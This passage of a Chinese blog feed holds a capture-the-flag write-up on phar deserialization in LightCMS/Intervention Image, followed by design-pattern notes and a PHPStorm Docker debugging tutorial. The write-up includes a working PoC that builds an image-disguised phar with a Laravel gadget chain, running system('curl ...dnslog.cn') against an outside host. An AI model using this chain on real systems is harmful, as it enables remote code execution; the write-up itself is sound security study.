class="line">    curl_close(<span class="variable">$ch</span>);</span><br><span class="line">    </span><br><span class="line"><span class="comment">// !!重点方法!!</span></span><br><span class="line"><span class="variable">$image</span> = Image::make(<span class="variable">$data</span>);</span><br><span class="line">    <span class="comment">// !!重点方法!!</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取文件的MIME类型</span></span><br><span class="line">    <span class="variable">$mime</span> = <span class="variable">$image</span>-&gt;mime();</span><br><span class="line">    <span class="keyword">return</span> [</span><br><span class="line">        <span class="string">&#x27;extension&#x27;</span> =&gt; <span class="variable">$extension</span> ?? (<span class="variable">$mime</span> ? strtolower(explode(<span class="string">&#x27;/&#x27;</span>, <span class="variable">$mime</span>)[<span class="number">1</span>]) : <span class="string">&#x27;&#x27;</span>),</span><br><span class="line">        <span class="string">&#x27;data&#x27;</span> =&gt; <span class="variable">$data</span></span><br><span class="line">    ];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Image 是一个 Facade。具体的 Facade逻辑可以暂时不用理会，只需知道 Facade 的 <code>__callStatic()</code> 有一段代码 <code>$instance-&gt;$method(...$args);</code> 即可。</p><p><code>Image::make()</code> 最终调用了 <code>Intervention\Image\ImageManager make()</code> 方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">Intervention\Image\ImageManager</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">make</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//createDriver()将实例化Intervention\Image\Gd\Driver类并返回</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;createDriver()-&gt;init(<span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">====================</span><br><span class="line">Intervention\Image\Gd\Driver <span class="keyword">extends</span> \Intervention\Image\AbstractDriver</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">Decoder <span class="variable">$decoder</span> = <span class="literal">null</span>, Encoder <span class="variable">$encoder</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ....</span><br><span class="line">    <span class="comment">//执行完这个 __construct() 后，会自动执行抽象父类 AbstractDriver 的 init()方法</span></span><br><span class="line">    <span class="comment">//具体好像是PHP的某个机制使得其会自动调用init()。还没深究</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;decoder = <span class="variable">$decoder</span> ? <span class="variable">$decoder</span> : <span class="keyword">new</span> Decoder;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;encoder = <span class="variable">$encoder</span> ? <span class="variable">$encoder</span> : <span class="keyword">new</span> Encoder;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">====================</span><br><span class="line">Intervention\Image\AbstractDriver</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">init</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;decoder-&gt;init(<span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">====================</span><br><span class="line">Intervention\Image\AbstractDecoder</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">init</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;data = <span class="variable">$data</span>;</span><br><span class="line"><span class="comment">//根据远程文件的内容，执行不一样的方法</span></span><br><span class="line">    <span class="keyword">switch</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        .....</span><br><span class="line">        <span class="comment">//上传文件是图片（二进制数据），则为true</span></span><br><span class="line">        <span class="keyword">case</span> <span class="keyword">$this</span>-&gt;isBinary():</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;initFromBinary(<span class="keyword">$this</span>-&gt;data);</span><br><span class="line">        <span class="comment">//若文件内容是一串url，则为true</span></span><br><span class="line">        <span class="keyword">case</span> <span class="keyword">$this</span>-&gt;isUrl():</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;initFromUrl(<span class="keyword">$this</span>-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个switch派生了这个漏洞需要利用的两个分支：phar反序列化的点 及 上传phar文件的点。</p><h3 id="phar反序列化"><a href="#phar反序列化" class="headerlink" title="phar反序列化"></a>phar反序列化</h3><p>进入 <code>case $this-&gt;isUrl()</code>分支，跟进 <code>$this-&gt;initFromUrl()</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">initFromUrl</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ......</span><br><span class="line"><span class="comment">//!!重点方法!!</span></span><br><span class="line">    <span class="comment">//$url可控，为远程文件内容。若指定为一个phar文件即可触发反序列化</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$data</span> = @file_get_contents(<span class="variable">$url</span>, <span class="literal">false</span>, <span class="variable">$context</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;initFromBinary(<span class="variable">$data</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//!!重点方法!!</span></span><br><span class="line">......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="上传phar文件"><a href="#上传phar文件" class="headerlink" title="上传phar文件"></a>上传phar文件</h3><p>进入 <code>case $this-&gt;isBinary()</code>分支，跟进 <code>$this-&gt;initFromBinary()</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">initFromBinary</span>(<span class="params"><span class="variable">$binary</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$resource</span> = @imagecreatefromstring(<span class="variable">$binary</span>);</span><br><span class="line">    <span class="variable">$image</span> = <span class="keyword">$this</span>-&gt;initFromGdResource(<span class="variable">$resource</span>);</span><br><span class="line">    <span class="comment">//获取文件MIME类型</span></span><br><span class="line">    <span class="comment">//CVE-2021-27112的补丁就是根据这里获取的文件头作为MIME类型来限制后缀，导致我们只能保存图片类型的后缀</span></span><br><span class="line">    <span class="comment">//不过文件后缀和文件头对phar文件没有影响，只要内容格式正确即可</span></span><br><span class="line">    <span class="variable">$image</span>-&gt;mime = finfo_buffer(finfo_open(FILEINFO_MIME_TYPE), <span class="variable">$binary</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$image</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>综上分析，我们可以得出这样一个利用链：<strong>首先上传一个文件头是图片类型的phar文件，phar文件内容为 phpggc 中laravel6.x的反序列化链。获取到phar文件上传路径后，然后再上传一个“URL文件”，内容为phar路径的文件。即可触发phar反序列化</strong></p><h2 id="POC编写"><a href="#POC编写" class="headerlink" title="POC编写"></a>POC编写</h2><p>按照正常逻辑，我们的POC如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//链子从phpggc扒拉下来的</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Broadcasting</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">PendingBroadcast</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">events</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$event</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$function</span>, <span class="variable">$parameter</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;events = <span class="keyword">new</span> \Illuminate\Bus\Dispatcher(<span class="variable">$function</span>); </span><br><span class="line">            <span class="keyword">$this</span>-&gt;event = <span class="keyword">new</span> \Illuminate\Queue\CallQueuedClosure(<span class="variable">$parameter</span>); </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Bus</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Dispatcher</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">queueResolver</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$function</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;queueResolver = <span class="variable">$function</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Queue</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">CallQueuedClosure</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">connection</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$parameter</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;connection = <span class="variable">$parameter</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">$o = new \Illuminate\Broadcasting\PendingBroadcast(&#x27;system&#x27;,&#x27;curl xxx1.8ogfme.dnslog.cn&#x27;);</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&#x27;phar.phar&#x27;</span>);</span><br><span class="line">    <span class="comment">//设置GIF文件头</span></span><br><span class="line">    <span class="variable">$phar</span> -&gt; setStub(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); </span><br><span class="line">    <span class="variable">$phar</span> -&gt; addFromString(<span class="string">&#x27;test.txt&#x27;</span>,<span class="string">&#x27;test&#x27;</span>);</span><br><span class="line">    <span class="variable">$phar</span> -&gt; setMetadata(<span class="variable">$o</span>);</span><br><span class="line">    <span class="variable">$phar</span> -&gt; stopBuffering();</span><br><span class="line">    rename(<span class="string">&#x27;phar.phar&#x27;</span>,<span class="string">&#x27;phar.jpg&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>使用 xxd 查看文件结构：</p><img src="/2021/05/10/2021-05-10-HongMaoBei2021-log/1-4.png" width="600px"><p>请求如下：</p><img src="/2021/05/10/2021-05-10-HongMaoBei2021-log/1-3.png" width="800px"><p>然后。。。就报错了。。。由于下载远程图片时使用了 <code>imagecreatefromstring()</code>。而我们的 <em>phar.jpg</em> 不是一个正规的图片，导致该方法无法正常生成图片，遂报错。。。</p><img src="/2021/05/10/2021-05-10-HongMaoBei2021-log/1-2.png" width="800px"><p>解决办法也挺简单，只需要在文件中存在有 <code>&lt;?php __HALT_COMPILER(); ?&gt;</code> 即可。哪怕它位于文件的末尾也是可行的。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">$o = new \Illuminate\Broadcasting\PendingBroadcast(&#x27;system&#x27;,&#x27;curl xxx1.8ogfme.dnslog.cn&#x27;);</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&#x27;phar.phar&#x27;</span>);</span><br><span class="line">    <span class="comment">//在文件头处放一个正常图片即可</span></span><br><span class="line"><span class="variable">$f</span> = file_get_contents(<span class="string">&quot;222222.png&quot;</span>);</span><br><span class="line">    <span class="variable">$phar</span> -&gt; setStub(<span class="variable">$f</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); </span><br><span class="line">    <span class="variable">$phar</span> -&gt; addFromString(<span class="string">&#x27;test.txt&#x27;</span>,<span class="string">&#x27;test&#x27;</span>);</span><br><span class="line">    <span class="variable">$phar</span> -&gt; setMetadata(<span class="variable">$o</span>);</span><br><span class="line">    <span class="variable">$phar</span> -&gt; stopBuffering();</span><br><span class="line">    rename(<span class="string">&#x27;phar.phar&#x27;</span>,<span class="string">&#x27;phar.jpg&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序成功返回上传文件路径：</p><img src="/2021/05/10/2021-05-10-HongMaoBei2021-log/1-5.png" width="1000px"><p>根据文件路径构造 “URL文件” 的内容：</p><img src="/2021/05/10/2021-05-10-HongMaoBei2021-log/1-6.png" width="500px"><p>此时再次请求，成功执行命令：</p><img src="/2021/05/10/2021-05-10-HongMaoBei2021-log/1-7.png" width="800px">]]></content>
    
    
    <summary type="html">&lt;p&gt;昨天被我亲爱的小杰杰和师弟拉去玩耍了一波红帽杯。。来写下wp做个小记录。&lt;/p&gt;
&lt;p&gt;这次还是只解出来一题WEB2，，老废物了。。。。&lt;/p&gt;
&lt;p&gt;最近没咋更博客。。因为文章都发到安全客上混点零花钱用了。。。= =&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    <category term="WEB" scheme="http://example.com/categories/CTF/WEB/"/>
    
    
    <category term="PHP" scheme="http://example.com/tags/PHP/"/>
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
    <category term="LightCMS" scheme="http://example.com/tags/LightCMS/"/>
    
    <category term="Yii2" scheme="http://example.com/tags/Yii2/"/>
    
  </entry>
  
  <entry>
    <title>PHP设计模式学习</title>
    <link href="http://example.com/2021/03/24/2021-03-24-php-design-patterns/"/>
    <id>http://example.com/2021/03/24/2021-03-24-php-design-patterns/</id>
    <published>2021-03-24T12:10:33.000Z</published>
    <updated>2021-03-24T15:27:19.236Z</updated>
    
    <content type="html"><![CDATA[<p>发现了这个写的好好，</p><p><a href="https://designpatternsphp.readthedocs.io/zh_CN/latest/README.html">https://designpatternsphp.readthedocs.io/zh_CN/latest/README.html</a></p><p>啧。。感觉没有再重复写的必要了。就简单在这里写写理解吧。以下都是较为简单的涉猎了下写的理解，可能有不对的地方。。</p><p>学习源码：</p><p><a href="https://github.com/DesignPatternsPHP/DesignPatternsPHP">https://github.com/DesignPatternsPHP/DesignPatternsPHP</a></p><span id="more"></span><br><h1 id="抽象工厂模式"><a href="#抽象工厂模式" class="headerlink" title="抽象工厂模式"></a>抽象工厂模式</h1><p><strong>个人理解：</strong></p><p>使用对应工厂类（Factory）实例化对应的内部类，基本上是一个工厂类对一个内部类，避免在外部直接实例化内部类。</p><p><strong>好处：</strong></p><p>使用工厂类实例化的时候，外部调用者不需要知道内部类实例化需要传什么参数，直接调用工厂类的特定方法即可。</p><br><h1 id="生成器模式"><a href="#生成器模式" class="headerlink" title="生成器模式"></a>生成器模式</h1><p><strong>个人理解：</strong></p><p>Interface Builder: 生成器接口，用于定义具有<strong>相同</strong>或<strong>类似</strong>功能的内部类要实现的方法。比如 数据库驱动类，数据库驱动有 mysql、oracle、mssql 等等，需要一一实现生成器接口。</p><p>暴露给外部类调用的就只有一个 <strong>导向器</strong>（Director），通过传入各个不同的类实例，来调用这些类的生成器方法，将一个 “空类” 包装好，设置好该设置的属性。</p><p><strong>好处：</strong></p><p>外部调用者直接向<strong>导向器</strong>传入实例即可得到对应类的 “完整版”。不需要外部调用着手动配置。</p><br><p>。。。。未完待续。。随缘更新。。。 = =</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;发现了这个写的好好，&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://designpatternsphp.readthedocs.io/zh_CN/latest/README.html&quot;&gt;https://designpatternsphp.readthedocs.io/zh_CN/latest/README.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;啧。。感觉没有再重复写的必要了。就简单在这里写写理解吧。以下都是较为简单的涉猎了下写的理解，可能有不对的地方。。&lt;/p&gt;
&lt;p&gt;学习源码：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/DesignPatternsPHP/DesignPatternsPHP&quot;&gt;https://github.com/DesignPatternsPHP/DesignPatternsPHP&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="PHP" scheme="http://example.com/categories/PHP/"/>
    
    
    <category term="PHP" scheme="http://example.com/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>PHPSTORM 调试 Docker内项目</title>
    <link href="http://example.com/2021/03/17/2021-03-17-phpstorm-docker/"/>
    <id>http://example.com/2021/03/17/2021-03-17-phpstorm-docker/</id>
    <published>2021-03-17T12:04:27.000Z</published>
    <updated>2021-03-24T15:33:56.028Z</updated>
    
    <content type="html"><![CDATA[<p>本文首发在 Freebuf。但好像排版没那么好看 233.。。。于是想博客也发一份对照看看，个人感觉还是我这里的排版好看点哈哈哈</p><span id="more"></span><br><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在做一些CTF的审计题或者复现漏洞时，会得到 Docker 环境。需要我们在 Docker环境中进行代码调试。在 PHP 代码审计中，没有好的调试环境（如 xdebug这类调试工具），单单靠 var_dump 和 debug_print_backtrace 来手撕代码，效率十分低下。而要配好一个调试环境有时也是挺多坑的。俗话说“搭建环境两小时，漏洞复现两分钟”。本文就来简单说说如何使用 PHPSTORM 调试 Docker项目。</p><br><p>在开始之前，需要简单了解下 Docker。至少要会最基本的用法。不过由于主要是讲 PHPSTORM 调试的。所以 Docker介绍不会讲太多。若想了解更多的话建议看手册。</p><br><h1 id="Docker基本用法"><a href="#Docker基本用法" class="headerlink" title="Docker基本用法"></a>Docker基本用法</h1><p>首先要知道 Docker 最基本的两样东西：<strong>image</strong> 和 <strong>container</strong></p><p><strong>image</strong> 就是镜像，搭建一个 Docker 环境最基本的就是 image。可以<strong>简单理解</strong>为这就是创建虚拟机的那个镜像。</p><p><strong>container</strong> 就是容器。即 依据 image，创建出来的虚拟环境。可以<strong>简单理解</strong>为就是运行着的虚拟机</p><br><p>Docker 的配置文件为 Dockerfile。该文件内容为构建 container 的命令。基本命令有：</p><p><strong>FROM</strong> 设置 container 运行在哪个 image 上。必须写在 Dockerfile 的开头。可以在 <a href="https://hub.docker.com/">Docker Hub</a> 里找适合的 image。</p><p><strong>RUN</strong> 在 image <strong>build</strong> 时执行命令。一般用于安装环境</p><p><strong>CMD</strong> 在 container<strong>刚启动</strong>时执行命令。一般用于启动服务</p><p><strong>COPY</strong> 将宿主机的文件拷贝到 container中</p><p><strong>WORKDIR</strong> 设置工作目录。所有命令都会在这个目录的基础上进行工作</p><br><p>了解了上面的三个命令后，我们可以来简单写一个 Dockerfile了。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">基础 image 为 php:7.3-apache</span></span><br><span class="line">FROM php:7.3-apache</span><br><span class="line"><span class="meta">#</span><span class="bash">安装 xdebug 扩展 并开启</span></span><br><span class="line">RUN pecl install xdebug &amp;&amp; \</span><br><span class="line">docker-php-ext-enable xdebug</span><br><span class="line"><span class="meta">#</span><span class="bash">将 宿主机的 phpinfo.php 拷贝到 container /var/www/html/phpinfo.php 中</span></span><br><span class="line">COPY ./phpinfo.php /var/www/html/phpinfo.php</span><br></pre></td></tr></table></figure><p>写完后在 Dockerfile 的目录里运行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build -t test/testmyphp .</span><br></pre></td></tr></table></figure><p>等命令跑完，输入以下命令即可看到创建好的 image</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> docker image ls</span></span><br><span class="line">REPOSITORY                          TAG                  IMAGE ID            CREATED             SIZE</span><br><span class="line">test/testmyphp                      latest               4931b92274f2        56 seconds ago      413MB</span><br><span class="line">php                                 7.3-apache           b79d423ea1e9        2 months ago        411MB</span><br></pre></td></tr></table></figure><p>要想让 container 运行起来，使用如下命令。使用 <code>-p</code> 来指定映射端口，左边是宿舍机端口，右边是 container 端口</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -p 81:80 test/testmyphp</span><br></pre></td></tr></table></figure><p>查看运行中的 container</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> docker container ls</span></span><br><span class="line">CONTAINER ID        IMAGE              PORTS                ......</span><br><span class="line">10b8c28b2f69        test/testmyphp     0.0.0.0:81-&gt;80/tcp   ......</span><br></pre></td></tr></table></figure><p>进入 container 的  shell</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> docker <span class="built_in">exec</span> -it CONTAINER_ID值 bash</span></span><br><span class="line">root@10b8c28b2f69:/var/www/html# </span><br></pre></td></tr></table></figure><p>至此，基本的 Docker 环境我们就建好了。接下来研究下如何让 PHPSTORM 调试 Docker 项目</p><br><h1 id="调试方式一-Docker挂载调试"><a href="#调试方式一-Docker挂载调试" class="headerlink" title="调试方式一 - Docker挂载调试"></a>调试方式一 - Docker挂载调试</h1><p>这里做测试使用前文的 Dockerfile，需要按照实际情况进行配置添加。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">基础 image 为 php:7.3-apache</span></span><br><span class="line">FROM php:7.3-apache</span><br><span class="line"><span class="meta">#</span><span class="bash">安装 xdebug 扩展 并开启</span></span><br><span class="line">RUN pecl install xdebug &amp;&amp; \</span><br><span class="line">docker-php-ext-enable xdebug</span><br><span class="line"><span class="meta">#</span><span class="bash"> !!! 使用一个启动脚本来启动服务 !!!</span></span><br><span class="line">COPY ./start.sh /start.sh</span><br><span class="line">RUN chmod +x /start.sh</span><br><span class="line">CMD [&quot;/start.sh&quot;]</span><br></pre></td></tr></table></figure><p>start.sh 内容</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">配置 Xdebug</span></span><br><span class="line">echo &quot;xdebug.client_host = host.docker.internal&quot; &gt;&gt; /usr/local/etc/php/conf.d/docker-php-ext-xdebug.ini</span><br><span class="line">echo &quot;xdebug.client_port = 9003&quot; &gt;&gt; /usr/local/etc/php/conf.d/docker-php-ext-xdebug.ini</span><br><span class="line">echo &quot;xdebug.mode = debug&quot; &gt;&gt; /usr/local/etc/php/conf.d/docker-php-ext-xdebug.ini</span><br><span class="line">echo &quot;xdebug.max_nesting_level = 1000&quot; &gt;&gt; /usr/local/etc/php/conf.d/docker-php-ext-xdebug.ini</span><br><span class="line">echo &quot;xdebug.discover_client_host = true&quot; &gt;&gt; /usr/local/etc/php/conf.d/docker-php-ext-xdebug.ini</span><br><span class="line"><span class="meta">#</span><span class="bash">重启 apache ssh</span></span><br><span class="line">service apache2 restart</span><br></pre></td></tr></table></figure><p>重建 image：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">最好先删掉之前的再重建</span></span><br><span class="line">docker image rm IMAGE值 -f</span><br><span class="line">docker build -t test/testmyphp .</span><br></pre></td></tr></table></figure><p>重建完先不急着跑 container。先定位到我们的项目代码位置</p><img src="/2021/03/17/2021-03-17-phpstorm-docker/15.png" width="500px"><p>使用 Docker 的 <em>Bind mounts</em> 技术。将宿主机的项目目录映射到 container 的网站目录下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -p 81:80 --mount type=bind,source=/home/xp/test_docker/test_program,target=/var/www/html test/testmyphp</span><br></pre></td></tr></table></figure><p>至此，调试环境所需要的服务就安装好了，接下来配置 PHPSTORM。</p><br><h2 id="配置-PHPSTORM"><a href="#配置-PHPSTORM" class="headerlink" title="配置 PHPSTORM"></a>配置 PHPSTORM</h2><p>直接使用 <code>Open</code> 打开项目</p><br><p><strong>配置 目录映射</strong></p><p>进入 <em>File -&gt; Settings -&gt; Languages &amp; Frameworks -&gt; PHP -&gt; Servers</em>。配置目录映射</p><p>注意一定要把 <em>Use path mappings</em> 的勾勾上，才能配置目录映射</p><p><em>Absolute path on the server</em>  是要手动打上服务器路径的</p><img src="/2021/03/17/2021-03-17-phpstorm-docker/8.png" width="800px"><p><strong>设置Xdebug端口</strong></p><p>进入 <em>File -&gt; Settings -&gt; Languages &amp; Frameworks -&gt; PHP</em> -&gt; Debug。设置 <em>Xdebug Debug port</em> 为 9003。和 php 配置一致。</p><img src="/2021/03/17/2021-03-17-phpstorm-docker/9.png" width="800px"><p><strong>配置一个 Run/Debug Configuration</strong></p><p>点击 PHPSTORM 右上角的 *Add Configuration….*。进入配置面，新增一个 PHP Web Page。并进行如下简单的配置即可（改名字设url 路径）</p><img src="/2021/03/17/2021-03-17-phpstorm-docker/10.png" width="900px"><p><strong>启动 PHP Debug Listening</strong></p><p>直接点击 PHPSTROM 右上角的 <em>小电话</em> ，即可开启监听</p><img src="/2021/03/17/2021-03-17-phpstorm-docker/11.png" width="500px"><p><strong>验证</strong></p><p>在 